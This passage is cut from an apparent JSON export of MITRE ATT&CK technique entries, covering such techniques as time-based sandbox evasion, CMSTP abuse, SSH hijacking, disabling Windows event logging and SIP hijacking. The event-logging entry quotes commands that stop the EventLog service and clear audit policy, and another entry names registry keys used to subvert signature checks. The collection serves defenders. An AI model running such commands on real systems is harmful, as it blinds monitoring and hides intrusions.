functions.","platforms":["macOS","Windows","Linux"],"tactics":["Discovery"],"campaigns":[],"groups":["Lazarus Group","HEXANE"]},"T1087.003":{"id":"T1087.003","name":"Email Account","description":"Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).^[[1]](https://docs.microsoft.com/en-us/exchange/email-addresses-and-address-books/address-lists/address-lists?view=exchserver-2019)^\n\nIn on-premises Exchange and Exchange Online, the`Get-GlobalAddressList` PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.^[[2]](https://docs.microsoft.com/en-us/powershell/module/exchange/email-addresses-and-address-books/get-globaladdresslist)^^[[3]](https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/)^\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.^[[4]](https://support.google.com/a/answer/166870?hl=en)^","platforms":["Windows","Office 365","Google Workspace"],"tactics":["Discovery"],"campaigns":["C0027"],"groups":["TA505","Magic Hound","Sandworm Team"]},"T1497.003":{"id":"T1497.003","name":"Time Based Evasion","description":"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.^[[1]](https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc)^\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.^[[2]](https://news.sophos.com/en-us/2021/07/04/independence-day-revil-uses-supply-chain-exploit-to-attack-hundreds-of-businesses/)^^[[3]](https://www.netskope.com/blog/nitol-botnet-makes-resurgence-evasive-sandbox-analysis-technique)^ Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).^[[4]](https://www.joesecurity.org/blog/3660886847485093803)^^[[5]](https://www.joesecurity.org/blog/498839998833561473)^\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.^[[6]](https://www.isaca.org/resources/isaca-journal/issues/2017/volume-6/evasive-malware-tricks-how-malware-evades-detection-by-sandboxes)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion","Discovery"],"campaigns":["Operation Dream Job"],"groups":[]},"T1218.003":{"id":"T1218.003","name":"CMSTP","description":"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. ^[[1]](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc786431(v=ws.10))^ CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. ^[[2]](https://twitter.com/ItsReallyNick/status/958789644165894146)^ Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs ^[[3]](https://msitpros.com/?p=3960)^  and/or COM scriptlets (SCT) from remote servers. ^[[4]](https://twitter.com/NickTyrer/status/958450014111633408)^ ^[[5]](https://github.com/api0cradle/UltimateAppLockerByPassList)^ ^[[6]](http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/)^ This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. ^[[3]](https://msitpros.com/?p=3960)^ ^[[5]](https://github.com/api0cradle/UltimateAppLockerByPassList)^ ^[[6]](http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["MuddyWater","Cobalt Group"]},"T1563.001":{"id":"T1563.001","name":"SSH Hijacking","description":"Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.^[[1]](https://www.slideshare.net/morisson/mistrusting-and-abusing-ssh-13526219)^^[[2]](https://www.blackhat.com/presentations/bh-usa-05/bh-us-05-boileau.pdf)^^[[3]](https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking)^^[[4]](https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident)^\n\n[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).","platforms":["Linux","macOS"],"tactics":["Lateral Movement"],"campaigns":[],"groups":[]},"T1562.002":{"id":"T1562.002","name":"Disable Windows Event Logging","description":"Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.^[[1]](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)^ This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.^[[2]](https://www.coretechnologies.com/blog/windows-services/eventlog/)^ By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to `Security Settings\\Local Policies\\Audit Policy` for basic audit policy settings or `Security Settings\\Advanced Audit Policy Configuration` for advanced audit policy settings.^[[3]](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/audit-policy)^^[[4]](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/advanced-security-audit-policy-settings)^ `auditpol.exe` may also be used to set audit policies.^[[5]](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol)^\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the `Set-Service -Name EventLog -Status Stopped` or `sc config eventlog start=disabled` commands (followed by manually stopping the service using `Stop-Service  -Name EventLog`).^[[6]](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1562-impair-defenses/disable-windows-event-logging)^^[[7]](https://ptylu.github.io/content/report/report.html?report=25)^ Additionally, the service may be disabled by modifying the “Start” value in `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog` then restarting the system for the change to take effect.^[[7]](https://ptylu.github.io/content/report/report.html?report=25)^\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security`, then reboot the system to disable the Security EventLog.^[[8]](https://web.archive.org/web/20211107115646/https://twitter.com/klinix5/status/1457316029114327040)^ Second, with Administrator privilege, adversaries may modify the same values in `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System` and `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application` to disable the entire EventLog.^[[7]](https://ptylu.github.io/content/report/report.html?report=25)^\n\nAdditionally, adversaries may use `auditpol` and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the `/success` or `/failure` parameters. For example, `auditpol /set /category:”Account Logon” /success:disable /failure:disable` turns off auditing for the Account Logon category.^[[9]](https://strontic.github.io/xcyclopedia/library/auditpol.exe-214E0EA1F7F7C27C82D23F183F9D23F1.html)^^[[10]](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.md)^ To clear the audit policy, adversaries may run the following lines: `auditpol /clear /y` or `auditpol /remove /allusers`.^[[10]](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.md)^\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":["SolarWinds Compromise","2016 Ukraine Electric Power Attack"],"groups":["Threat Group-3390","Magic Hound","APT29","Sandworm Team","UNC2452"]},"T1029":{"id":"T1029","name":"Scheduled Transfer","description":"Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).","platforms":["Linux","macOS","Windows"],"tactics":["Exfiltration"],"campaigns":[],"groups":["Higaisa"]},"T1021.002":{"id":"T1021.002","name":"SMB/Windows Admin Shares","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,^[[1]](https://en.wikipedia.org/wiki/Server_Message_Block)^ to interact with systems using remote procedure calls (RPCs),^[[2]](https://technet.microsoft.com/en-us/library/cc787851.aspx)^ transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.^[[3]](http://support.microsoft.com/kb/314984)^","platforms":["Windows"],"tactics":["Lateral Movement"],"campaigns":["SolarWinds Compromise","Operation Wocao","2016 Ukraine Electric Power Attack"],"groups":["Moses Staff","Threat Group-1314","Wizard Spider","APT41","Ke3chang","Turla","FIN13","Chimera","Fox Kitten","Sandworm Team","APT3","FIN8","Blue Mockingbird","APT32","Orangeworm","Lazarus Group","Deep Panda","APT39","APT28","APT29","Operation Wocao"]},"T1525":{"id":"T1525","name":"Implant Internal Image","description":"Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.^[[1]](https://rhinosecuritylabs.com/aws/cloud-container-attack-tool/)^\n\nA tool has been developed to facilitate planting backdoors in cloud container images.^[[2]](https://github.com/RhinoSecurityLabs/ccat)^ If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).^[[1]](https://rhinosecuritylabs.com/aws/cloud-container-attack-tool/)^","platforms":["IaaS","Containers"],"tactics":["Persistence"],"campaigns":[],"groups":[]},"T1572":{"id":"T1572","name":"Protocol Tunneling","description":"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.^[[1]](https://www.ssh.com/ssh/tunneling)^ \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.^[[2]](https://www.bleepingcomputer.com/news/security/new-godlua-malware-evades-traffic-monitoring-via-dns-over-https/)^ \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. ","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["C0027","CostaRicto"],"groups":["FIN13","Magic Hound","FIN6","Chimera","OilRig","Fox Kitten","Cobalt Group","Leviathan","CostaRicto"]},"T1218.002":{"id":"T1218.002","name":"Control Panel","description":"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a `CPlApplet` function.^[[1]](https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx)^^[[2]](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf)^ For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.^[[1]](https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx)^ Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.^[[1]](https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx)^ ^[[2]](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf)^^[[3]](https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/)^\n\nMalicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns^[[2]](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf)^^[[3]](https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/)^ or executed as part of multi-stage malware.^[[4]](https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/)^ Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls`. Even when these registered DLLs do not comply with the CPL file specification and do not export `CPlApplet` functions, they are loaded and executed through its `DllEntryPoint` when Control Panel is executed. CPL files not exporting `CPlApplet` are not directly executable.^[[5]](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Ember Bear"]},"T1599.001":{"id":"T1599.001","name":"Network Address Translation Traversal","description":"Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.^[[1]](https://tools.ietf.org/html/rfc1918)^\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities","platforms":["Network"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1608.002":{"id":"T1608.002","name":"Upload Tool","description":"Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.\n\nTools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).^[[1]](https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage)^ Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.^[[2]](https://www.dragos.com/blog/industry-news/a-new-water-watering-hole/)^^[[3]](https://www.malwarebytes.com/blog/news/2019/12/theres-an-app-for-that-web-skimmers-found-on-paas-heroku)^^[[4]](https://www.intezer.com/blog/malware-analysis/kud-i-enter-your-server-new-vulnerabilities-in-microsoft-azure/)^\n\nAdversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Operation Dream Job","C0010"],"groups":["Threat Group-3390","Lazarus Group"]},"T1547.005":{"id":"T1547.005","name":"Security Support Provider","description":"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages` and `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages`. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.^[[1]](http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html)^","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":["Lazarus Group"]},"T1550":{"id":"T1550","name":"Use Alternate Authentication Material","description":"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.^[[1]](https://csrc.nist.gov/glossary/term/authentication)^^[[2]](https://csrc.nist.gov/glossary/term/Multi_Factor-Authentication)^\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n","platforms":["Windows","Office 365","SaaS","Google Workspace","IaaS","Containers"],"tactics":["Defense Evasion","Lateral Movement"],"campaigns":["SolarWinds Compromise"],"groups":["APT29","UNC2452"]},"T1597.001":{"id":"T1597.001","name":"Threat Intel Vendors","description":"Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.^[[1]](https://d3security.com/blog/10-of-the-best-open-source-threat-intelligence-feeds/)^\n\nAdversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1011":{"id":"T1011","name":"Exfiltration Over Other Network Medium","description":"Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.\n\nAdversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.","platforms":["Linux","macOS","Windows"],"tactics":["Exfiltration"],"campaigns":[],"groups":[]},"T1602.002":{"id":"T1602.002","name":"Network Device Configuration Dump","description":"Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.^[[1]](https://us-cert.cisa.gov/ncas/alerts/TA18-106A)^^[[2]](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)^ These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ","platforms":["Network"],"tactics":["Collection"],"campaigns":[],"groups":[]},"T1589":{"id":"T1589","name":"Gather Victim Identity Information","description":"Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.^[[1]](https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/)^ Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).^[[2]](https://www.opm.gov/cybersecurity/cybersecurity-incidents/)^^[[3]](https://www.theregister.com/2017/09/26/deloitte_leak_github_and_google/)^^[[4]](https://www.theregister.com/2015/02/28/uber_subpoenas_github_for_hacker_details/)^^[[5]](https://labs.detectify.com/2016/04/28/slack-bot-token-leakage-exposing-business-critical-information/)^^[[6]](https://www.forbes.com/sites/runasandvik/2014/01/14/attackers-scrape-github-for-cloud-service-credentials-hijack-account-to-mine-virtual-currency/#242c479d3196)^^[[7]](https://github.com/dxa4481/truffleHog)^^[[8]](https://github.com/michenriksen/gitrob)^^[[9]](https://www.cnet.com/news/massive-breach-leaks-773-million-emails-21-million-passwords/)^\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":["Operation Dream Job","Operation Wocao"],"groups":["LAPSUS$","HEXANE","FIN13","APT32","Magic Hound"]},"T1562.004":{"id":"T1562.004","name":"Disable or Modify System Firewall","description":"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).^[[1]](https://twitter.com/TheDFIRReport/status/1498657772254240768)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":["Operation Wocao","SolarWinds Compromise"],"groups":["Carbanak","Rocke","TeamTNT","Dragonfly","Moses Staff","Magic Hound","Lazarus Group","APT38","Kimsuky","UNC2452","APT29","Operation Wocao","Dragonfly 2.0"]},"T1560":{"id":"T1560","name":"Archive Collected Data","description":"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.","platforms":["Linux","macOS","Windows"],"tactics":["Collection"],"campaigns":[],"groups":["Dragonfly","Patchwork","Axiom","Lazarus Group","APT28","APT32","FIN6","LuminousMoth","Ke3chang","menuPass","Leviathan","Honeybee","Dragonfly 2.0"]},"T1553.003":{"id":"T1553.003","name":"SIP and Trust Provider Hijacking","description":"Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode ^[[1]](https://msdn.microsoft.com/library/ms537359.aspx)^ digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  ^[[2]](https://msdn.microsoft.com/library/windows/desktop/aa388208.aspx)^ which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. ^[[3]](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)^\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) ^[[4]](https://blogs.technet.microsoft.com/eduardonavarro/2008/07/11/sips-subject-interface-package-and-authenticode/)^ to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  ^[[5]](https://docs.microsoft.com/windows-hardware/drivers/install/catalog-files)^) and are identified by globally unique identifiers (GUIDs). ^[[3]](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)^\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: ^[[3]](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)^\n\n* Modifying the `Dll` and `FuncName` Registry values in `HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}` that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP ^[[6]](https://github.com/mattifestation/PoCSubjectInterfacePackage)^ (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the `Dll` and `FuncName` Registry values in `HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}` that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP ^[[6]](https://github.com/mattifestation/PoCSubjectInterfacePackage)^ (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the `DLL` and 